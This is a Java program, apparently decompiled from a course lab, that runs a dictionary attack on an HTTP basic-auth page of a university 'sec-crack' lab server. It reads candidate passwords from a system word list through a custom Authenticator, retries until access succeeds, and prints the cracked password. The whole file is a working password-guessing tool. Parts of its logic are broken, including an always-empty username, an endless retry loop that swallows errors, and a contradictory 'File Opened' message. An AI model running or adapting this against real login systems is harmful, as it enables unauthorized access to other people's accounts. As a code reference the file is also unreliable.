public class Dictionary {
    static java.io.BufferedReader in;
    static MyAuthenticator Auth;
    public Dictionary() {
        super();
    }
    public static void main ( String[] a ) {
        java.net.Authenticator.setDefault ( ( java.net.Authenticator ) Auth );
        try {
            java.net.URL a0 = new java.net.URL ( "http://sec-crack.cs.rmit.edu./SEC/2/index.php" );
            boolean b = false;
            while ( !b ) {
                try {
                    in = new java.io.BufferedReader ( ( java.io.Reader ) new java.io.InputStreamReader ( a0.openStream() ) );
                    b = true;
                } catch ( java.io.IOException ignoredException ) {
                }
            }
            while ( in.readLine() != null ) {
            }
            java.io.PrintStream a1 = System.out;
            StringBuilder a2 = new StringBuilder().append ( "The successful Password found using a Dictionary search is = " );
            MyAuthenticator dummy = Auth;
            a1.println ( a2.append ( MyAuthenticator.finalPass() ).toString() );
        } catch ( java.net.MalformedURLException ignoredException0 ) {
            System.out.println ( "mfURL" );
        }
    }
    static {
        in = null;
        Auth = new MyAuthenticator();
    }
}
class MyAuthenticator extends java.net.Authenticator {
    String username;
    static String password;
    static String DictFile;
    static java.io.BufferedReader fReader;
    public MyAuthenticator() {
        super();
        this.username = "";
        label0: {
            label1: try {
                java.io.BufferedReader a = null;
                try {
                    a = new java.io.BufferedReader ( ( java.io.Reader ) new java.io.FileReader ( DictFile ) );
                } catch ( java.io.FileNotFoundException ignoredException ) {
                    break label1;
                }
                fReader = a;
                break label0;
            } catch ( java.io.IOException ignoredException0 ) {
                System.out.println ( "File  Failed.." );
                System.exit ( 1 );
                break label0;
            }
            System.out.println ( new StringBuilder().append ( "File " ).append ( DictFile ).append ( " Not Found" ).toString() );
            System.out.println ( " File Opened" );
            System.exit ( 1 );
        }
    }
    static void setPass ( String s ) {
        password = s;
    }
    static String finalPass() {
        return password;
    }
    static String getPass() {
        try {
            String s = fReader.readLine();
            password = s;
            if ( s == null ) {
                System.out.println ( new StringBuilder().append ( "Password Not found in file '" ).append ( DictFile ).append ( "'." ).toString() );
                System.exit ( 1 );
            }
        } catch ( java.io.IOException a ) {
            System.out.println ( "File IOException" );
            System.out.println ( ( Object ) a );
        }
        return password;
    }
    protected java.net.PasswordAuthentication getPasswordAuthentication() {
        return new java.net.PasswordAuthentication ( this.username, MyAuthenticator.getPass().toCharArray() );
    }
    static {
        password = "";
        DictFile = "/usr/share/lib/dict/words";
    }
}
